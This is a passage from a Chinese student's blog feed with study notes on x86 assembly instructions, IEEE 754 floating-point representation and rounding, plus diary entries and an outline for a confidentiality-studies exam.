t;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12(%ebp),%eax}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8(%ebp),%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%ebp,%esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;popl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%ebp命令行：gcc&nbsp;&nbsp;&nbsp;&nbsp;-02&nbsp;&nbsp;&nbsp;&nbsp;-S&nbsp;&nbsp;&nbsp;&nbsp;code.c&nbsp;&nbsp;&nbsp;&nbsp;-m32&nbsp;&nbsp;&nbsp;&nbsp;-fno-omit-frame-pointer生成汇编文件：code.s 2.汇编语言数据格式 在x86-32中，使用“字（Word）”来标识16位证书类型；“双字”表示32位；汇编语言指令所处理的数据类型一般是采用汇编指令的后缀来进行区分。 ▎二、第一条汇编指令1.第一条汇编指令实例 2.数据传送指令（mov） mov指令是汇编语言中被频繁使用的一个指令 数据传送（AT&amp;T语法）movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Source&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dest这是一个常见的指令，是将一个“双字（l）”从Source移到Dest中 允许的操作数类型立即数：常整数,如： $0x400,$-533 可以被1、2或4个字节来表示寄存器：8个通用寄存器之一存储器：四个连续的字节：支持多种访存寻址模式 扩展：寄存器和存储器的区别 3.数据传送指令支持的不同操作数类型组合（以movl为例） movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Imm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;示例：movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$0x4,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C语言表示：temp = 0x4 movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Imm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mem&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;示例：movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$-147,(%eax)&nbsp;&nbsp;&nbsp;C语言表示：*p = -147 movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;示例：movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%eax,%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C语言表示：temp1 = temp2 movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mem&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;示例：movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$eax,(%edx)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C语言表示：*p = temp movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mem&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;示例：movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(%eax),%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C语言表示：temp = p▶ Imm：立即数（操作数）▶ Reg：寄存器▶ Mem：存储器▶ (%eax)：表示的是%eax寄存器的内存地址*注意：不能两个操作数都为内存地址； 3.简单的寻址模式 间接寻址模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(R)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mem[Reg[R]]寄存器R指定内存地址：movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(%ecx),%eax 基址 + 偏移量寻址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D(R)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mem[Reg(R) + D]寄存器R指定内存起始地址，常数D给出偏移量：movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8(%ebp),%edx ▎学习感悟 今天还是学习了“汇编语言”，感觉自己慢慢的开始对一些概念和语法有了一些更深的理解，给了我以后学习的很大信心，让我觉得只要肯下功夫，就一定能学好的。 ▎每日一句 在成功的道路上，激情是需要的，志向是可贵的，但更重要的是那毫无情趣的近乎平常的坚守的毅力和勇气。]]></content>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《汇编语言程序设计》学习笔记（六）]]></title>
    <url>%2F2019%2F04%2F03%2F2019.04.03%EF%BC%8827%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天继续学习的是《汇编语言程序设计》，也看了关于C语言的教材，总结一下今天学的主要内容： 80x86计算机系统的初步 80x86处理器与保护模式初步 ▎一、80x86计算机系统的初步1.计算机系统 2.主存 存储单元的地址和内容： 存储器以字节（8bits）为单位存储信息； 每个字节单元有一个地址，从 0 编号，顺序加 1； 地址用二进制数表示（无符号整数写成十六进制）； 一个32位字要占用相继的 4 个字节：低位字节存入低地址，高位字节存入高地址； 字单元地址用它的弟弟值来表示； ▎二、80x86处理器与保护模式初步1.80x86处理器的发展历史 ① 8086/8088 微处理器 ② 80186和80286微处理器③ 32位80x86微处理器——80386微处理器 2.80386 的3种工作模式 实地址模式：操作相当于一个可进行 32 位快速运算的 8086； 虚地址模式：是80x86设计目标全部达到的工作模式，通过对程序使用的存储区采用分段、分页的存储管理机制，达到分级使用、互不干扰的保护目的，能为每个任务提供一台虚拟处理器，使每个任务单独执行快速切换； 虚拟8086模式：保护模式下同时模拟多个 8086 处理器； 3.32位微处理器的寄存器 80x86微处理器由16位升级为32位后，它的寄存器也对应升级为32位 8 个通用寄存器：%eax、%edx、%ecx、%ebx、%esi、%edi、%esp、%ebp； 指令寄存器扩展为 32 位，EIP； 6 个段寄存器（段寄存器是因为对内存的分段管理而设置的）：CS、DS、SS、ES、FS、GS；计算机需要对内存分段，以分配给不同的程序使用（类似于硬盘分页）。在描述内存分段时，需要有如下段的信息：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.段的大小；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.段的起始地址；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.段的管理属性（禁止写入/禁止执行/系统专用等）。需要用8个字节（64位）存储这些信息，但段寄存器只有16位，因此段寄存器中只能存储段号，再由段号映射到存在内存中的GDT，读取段的信息。段寄存器的长度均为 16 位，其中 13 位代表内存段的一个编号，称为“段选择器”。 #学习感悟 虽然自己的进度不是很快，但是听起课来还是很吃力，我决定先暂停“汇编语言”的学习，先把自己的知识课打牢，再来学习汇编语言，同时明天开始做第二阶段的测试。 #每日一句 人生的挑战，无处不在，满怀信心，轻装上路，明天永远是充满希望的战场。]]></content>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《汇编语言程序设计》学习笔记（五）]]></title>
    <url>%2F2019%2F04%2F02%2F2019.04.02%EF%BC%8826%EF%BC%89%2F</url>
    <content type="text"><![CDATA[今天继续学习了有关浮点数的部分知识： 浮点数的机器表示 浮点数的规格化和非规格化表示 浮点数表示的特性 如何给出浮点数表示 C语言中的浮点数 一、 浮点数表示的特性1.不同浮点数类型在数轴上的相对位置 注：越靠近数轴上的原点越紧密，两端的越远越疏散。 2.“小”浮点数实例 8位浮点数表示：exp域的宽度为4bits，frac域宽度为3bits问：Bias = ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bias = 2e-1 - 1 = 24-1 - 1 = 7 其他规则符合 IEEE 754规范 规格化/非规格化 表示0，NaN与无穷 Exp域对应的数值关系 3.取值范围 注：如果只看exp域和frac域的话，在电路上从小到大的比较和无符号位整数没有什么区别 4.一些特例 5.浮点数的一些编码特性 （几乎）可以直接使用无符号整数的比较方式反例（以下情况不能使用无符号整数进行比较）： 必须先比较符号位； 考虑+0，-0的特例； NaN的问题（不考虑符号位的话，NaN比其他值大） 其他情况都可以直接使用无符号数的比较方式 规格化 vs. 非规格化 规格化 vs. 无穷二、如何给出浮点数表示？1.给定一个实数，如何给出其浮点数的表示 基本流程1. 计算出精确值2. 将其转化为所需要的精度 如果指数的绝对值很大的话，可能会产生溢出 可能需要完成舍入（Rounding）操作 各种舍入模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$1.40 &nbsp;&nbsp;&nbsp;&nbsp; $1.60 &nbsp;&nbsp;&nbsp;&nbsp;$1.50 &nbsp;&nbsp;&nbsp;&nbsp;$2.50 &nbsp;&nbsp;&nbsp;&nbsp;-$1.50 Zero&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-$1 Round down&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-$2 Round up&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$3 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-$1 Nearest Even(default)&nbsp;&nbsp;&nbsp; \$1 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\$2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\$2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\$2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-\$2 2.向偶数舍入（Round-To-Even） ☛ 这是计算机内默认的舍入方式，也称为“向最接近值的舍入”（其他方式会产生统计误差） 关键的设计决策的是确定两个可能结果的中间数值得舍入 确保舍入后的最低有效数字是偶数 E.g.,round to nearest hundredth 1.2349999——&gt;1.23(less than half way) 1.2350001——&gt;1.24(Greater than half way) 1.2350000——&gt;1.24(Half way-Round up) 1.2350000——&gt;1.24(Half way-Round down ☛ 对二进制而言 “Even”意味着最低有效位数字需为0 最低有效位数字右侧的位串为100… 实例： 具体步骤① 将数值规格化（前导 1）② 舍入，以便符合位数的位数需求③ 调整 三、C语言中的浮点数 类型：单精度浮点数（float）和双精度浮点数（double） 类型转换：当int（32bits）、float和double等类型之间进行转换时，基本的原则如下：① double/float——&gt;int&nbsp;&nbsp;▶ 尾数部分被截断；&nbsp;&nbsp;▶ 如果发生溢出或者浮点是NaN，则转化结果没有定义，通常置为Tmin 或 Tmax；② int——&gt;double：能够精确转化③ int——&gt;float：不会溢出，但可能被舍入 #学习感悟 说句实在话，因为基础问题今天学的东西太难理解了，视频反复的听了3、4遍，做笔记的时候又认真的听了一遍，做了一遍笔记，可是有些地方老师讲的跳度太大，跟不上他的思路，所以说“基础很重要啊！”，以后每天还得挤出时间再恶补一下自己的基础知识，到时候再回头重新看一下这里的知识点。 #每日一句：在成功的道路上，激情是需要的，志向是可贵的，但更重要的是那毫无情趣的近乎平常的坚守的毅力和勇气]]></content>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《汇编语言程序设计》学习笔记（四）]]></title>
    <url>%2F2019%2F04%2F01%2F2019.04.01%EF%BC%8825%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;博客已经停更好多天了，前几天因为身体也没有学太多东西，今天刚到学校学习了一下有关浮点数的部分知识： 浮点数的机器表示 浮点数的规格化和非规格化表示 浮点数表示的特性 如何给出浮点数表示 C语言中的浮点数 前言：浮点数是表示小数的一种方法。所谓浮点就是小数点的位置不固定，与此相反有定点数，即小数点的位置固定。整数可以看做是一种特殊的定点数，即小数点在末尾。8086/8088中没有浮点数处理指令，不过从486起，CPU内置了浮点数处理器，可以执行浮点运算。一般的浮点数有点象科学计数法，包括符号位、指数部分和尾数部分。浮点数是指小数点位置可以浮动的数据类型。简单说浮点数是指能够精确到小数点以后的数值类型 一、 浮点数的机器表示1.IEEE的浮点数标准① IEEE的754标准② 二进制表示方式 2.浮点数示例 值&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二进制表示5.3/4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;101.1122.7/8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.111263.64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.1111112 局限性：只能精确的表达X/2k这类形式的数据 值&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二进制表示1/3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0101010101[01]…21/5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.001100110011[0011]…21/10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0001100110011[0011]…2 3.计算机当中的浮点数二进制表示 数字形式(-1)s M 2E s：表示符号（0 表示正数，1表示负数） M：表示尾数，是一个位于区间[1.0,2.0)内的小数 E：表示阶码 编码| s | exp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| frac&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| exp域代表的是 E frac域代表的是 M注意这里代表不是说exp域 = E，frac域 = M，这两者是有个转化的。 单精度浮点数：s宽度为 1 bit，exp域宽度为 8 bits，frac域宽度为 23 bits，总共为 31 bits； 双精度浮点数：s宽度为 1 bit，exp域宽度为 11 bits，frac域宽度为 52 bits，总共为 64 bits；二、浮点数的类型——浮点数的规格化和非规格化表示1.规格化的浮点数 满足条件&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp ≠ 000…0 且 exp ≠ 111…1 真实的阶码值需要减一个偏值量&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;E = Exp - Bias Exp：exp 域所表示的无符号数值 Bias的取值：bias = 2e-1-1，e = exp域的位数 ▷单精度数：127（Exp：1...254，E：-126...127） ▷双精度数：1023（Exp：1...2064，E：-1022...1023） frac 域的第一位隐含为 1M = 1.xxx…x2 因此 frac域的第一位的 1 可以省去，为：xxx…x2 Min 000…0（M = 1.000…00） Max 111…11（M = 2.0 - ε）(说明：因为是开区间，所以最大的数是2小一点点) 规格化的浮点数示例▷ Float F = 15213.0 1521310 = 111011011011012 = 1.11011011011012 ×213 尾数M = &nbsp;&nbsp;&nbsp;&nbsp;1.11011011011012frac = &nbsp;&nbsp;&nbsp;&nbsp;110110110110100000000002（说明：因为是 float 单精度浮点数，所以frac域的宽度为23bits，所以后面补0） 阶码E = 13Bias = 28-1-1 = 127（F 的 exp域的位数为 8）Exp = E + Bias = 13 + 127 = 140 = 100011002 2.非规格化浮点数 满足条件exp = 000…00 其他域的取值 E = -Bias + 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bias = 2e-1 - 1，e = exp域的位数 M = 0.xxx…x2，frac域的位为：xxx…x 非规格化浮点数具体示例 exp = 000…0，frac = 000…0：表示 0（注意有 +0 和 -0） exp = 000…0，frac ≠ 000…0：表示“非常接近”于0的浮点数（会逐步丧失精度，不会突然产生溢出） 3.一些特殊值 满足条件exp = 111…1 具体示例 exp = 111…1，frac = 000…0▷ 表示无穷：可用表示数值的溢出▷ 有正无穷和负无穷之分▷ 1.0/0.0 = + ∞，-1.0/0.0 = - ∞ exp = 111…1，frac ≠ 000…0▷ NOT-a-Number（NaN）▷ sqrt(-1)，∞，-∞ 每日一句： 多坚持一下、多努力一下、多思考一会，自然而然就会成功。]]></content>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[复试进度总结]]></title>
    <url>%2F2019%2F03%2F19%2F2019.03.19%EF%BC%8824%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;离复试时间还有 3 天，虽然背诵的知识准备的差不多了，但心理越来开始变得紧张了，是自己太重视了吧！我真的真的真的想学习自己感兴趣的东西，也想通过不断的努力实现这个梦想。再坚持坚持吧！挺过这几天，就可以进入梦想的学校学习了。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天再总结一下复习的情况吧： 1.《保密概论》 今天又把保密概论背了一遍，特别是自己不牢固的地方，我又加深了一下记忆，一会再过一遍《保密概论》，就是看一下，主要是熟悉下里面的内容。☛ 仍需巩固的地方：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 保密工作存在的问题；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 保密工作的任务；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 《保密法》的内容；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ 第九章的内容； 2.面试准备 按照昨天的计划进行，相关问题已经得到了解决，相关能力也有所提高，明天还要继续！ 3.每日一句 一个人的成功不取决于他的智慧，而是毅力。 注：最近几天因为忙着复试，心思都在复试身上，所以博客更新情况不像以前那么丰富，等复试结束以后，我还会认真学习，认真更博。]]></content>
      <tags>
        <tag>研究生复试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[复试复习总结]]></title>
    <url>%2F2019%2F03%2F18%2F2019.03.18%EF%BC%8823%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天的学习内容主要有：回顾第7、8、9章的知识点；准备了英语自我介绍和面试的问题，就说一下今天的学习总结和感悟吧！ 1.《保密概论》第7、8、9章的薄弱点第七章 &nbsp; 薄弱点 对特定场所的保密管理； 业务工作中的保密管理；注：特别是新闻出版的保密管理 保密工作的日常指导① 《保密法》第四十二条；② 保密培训的对象； 第八章 &nbsp; 薄弱点 保密检查的内容：第8、9、10点； 保密检查的实施：第5点； 保密检查中的问题：第4、5点； 整个第四节 泄密事件的查处工作； 第九章 &nbsp; 薄弱点 整个第九章还需要进一步巩固 以上就是第7、8、9章的知识比较薄弱的部分，有的记得不清、有的记得不准，明天在复习的时候再好好的巩固一下！ 2.英语自我介绍和面试 自我介绍：这一部分的发音的流畅还是有一点问题的，有些句子还需要进行改一下，有些单词的发音还需要多联系一下，今晚再对其进行优化一下； 面试问题：我准备了几个常问的问题，但是还没有开始复习，今晚也得再好好看看这几个问题，明天开始复习。 3.学习感悟 上面的反思和总结是今天学习中产生的，我现在感觉必须要好好利用时间，主要是提升自己英语口语水平，明天继续加油！]]></content>
      <tags>
        <tag>研究生复试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《保密概论》总知识点提纲]]></title>
    <url>%2F2019%2F03%2F17%2F2019.03.17%EF%BC%8822%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天背完了《保密概论的知识点》第8、9章的知识，终于把所有的知识都背完了，但是后面的几章还不是特别熟悉，前面的知识也有些遗忘，明天还要继续复习和背诵。今天就总结一下《保密概论》整本知识提纲，用做接下来的几天背诵抓手。 第一章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密基础知识1.保密工作概要 “保密”、“保密工作”的概念 ； 保密工作的特征； 保密工作的指导思想、依据； 保密工作的指导方针和基本原则； 2.国家秘密及其确定 国家秘密的概念和特征（三要素）； 国家秘密的等级和划分标准； 国家秘密事项的确定：定密责任人制度、三种情况、确定权限； 国家秘密事项保密期限的确定； 商业秘密的概念和三要素； 工作秘密的概念、主体； 第二章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密工作的地位和作用 保密工作是维护国家安全和利益的重要手段；① 在经济领域的保密工作；② 涉外活动中的保密工作；③ 军事领域的保密工作；④ 保密科学技术的保密工作； 保密工作是维护社会安定、保障经济建设和各项事业顺利进行的重要条件；① 保密工作是维护社会安定的客观需要；② 保密工作是保障经济建设和发展的需要；③ 做好保密工作是加快信息化建设的保证； 保密工作是党政军机关正常行使权利、履行职能的需要前言① 做好保密工作是党政军机关实施国家重大国家决策的客观需要；② 做好保密工作是保卫国家安全的客观需要；③ 做好保密工作是党政军机关维护国家统一、民族团结和社会稳定的客观需要 第三章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密工作的历史1.古代保密思想制度简述 夏商：文书 西周：一合而再离、三发而一知 秦汉：依次传行 唐代：《唐律》 宋、元、明、清：沿用《唐律》。机构：中书省、枢密院、锦衣卫、军机处； 2.革命战争年代的保密工作 中共一大的主张 中共二大的主张 1926年1月① 有关文件② 提出了几个问题 1927年8月7日的主张 周恩来——中共中央秘密工作委员会 抗日战争爆发后的新路线 1942年，毛泽东的主张 解放战争中，中央保密委员会 1948年，章程、保密委员会的性质 3.新中国成立后的保密工作 1950年 1951年 1952年6月，条例、意义 1958年，科学技术 建国之初到60年代 60年代中期 1978年 1980年《关于调整中央保密委员会和加强保密办事机构的通知》 1983年《关于中央保密委员会的体制改革和机构设置的报告》 4.新时期的保密工作 邓小平同志：1988年 江泽民同志：保密的重要性 胡锦涛同志 十五期间 2006年5月 2008、2009、2010 保密基础理论：《保密工作概论》、《保密管理工作概论》、《保密法学总论》、《保密法概论》、《信息技术保密学》、《信息安全保密教程》 保密学科建设：国家保密学院（十所） 修订《保密法》的时间、会议、内容（5条）、意义 处理好几个关系 第四章&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;保密工作面临的形势与任务1.依然严峻的保密形势 国际间政治经济科技和军事等方面斗争的特点：1）2）3） 窃密与反窃密的特点：1）2）3）4）5） 当前保密工作的现状：1）①②③；2）①②③；3）①②；4）①②③；5）①②③ 